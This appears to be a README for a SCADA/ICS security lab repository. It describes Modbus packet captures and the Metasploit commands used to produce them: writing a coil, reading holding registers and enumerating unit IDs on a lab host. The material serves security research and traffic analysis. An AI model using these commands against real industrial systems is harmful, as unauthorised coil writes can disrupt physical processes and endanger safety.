## Files Included
- **write.pcap**: Captures Modbus traffic where the WRITE_COILS action is performed.
- **read.pcap**: Captures Modbus traffic where the READ_HOLDING_REGISTERS action is performed.
- **findunitid.pcap**: Captures Modbus traffic where the findunitid module is used to enumerate available unit IDs.

## Metasploit Commands
### Writing to Coils (Command Injection)
```
use auxiliary/scanner/scada/modbusclient
set rhost 192.168.95.2
set data_address 40
set number 1
set data_coils 1
set action WRITE_COILS
run
```
This command writes a coil at data address `40` on the target `192.168.95.2`.

### Reading Holding Registers
```
set rhost 192.168.95.2
set data_address 0
set number 10
set action READ_HOLDING_REGISTERS
```
This command reads `10` holding registers starting from address `0` on the target `192.168.95.2`.

### Finding Unit IDs
```
use auxiliary/scanner/scada/modbus_findunitid
```
This command scans the target for active Modbus unit IDs.

## Usage
1. Load the Metasploit framework.
2. Use the corresponding module and set the required parameters.
3. Execute the attack and capture the traffic using Wireshark.
4. Analyze the `.pcap` files to observe the Modbus interactions.

## Notes
- These scripts are for educational and security research purposes only.
- Unauthorized access to systems is illegal and unethical.
- Ensure you have permission before running these tests.

## Author
This repository was created for testing SCADA/ICS security vulnerabilities and improving defensive mechanisms.

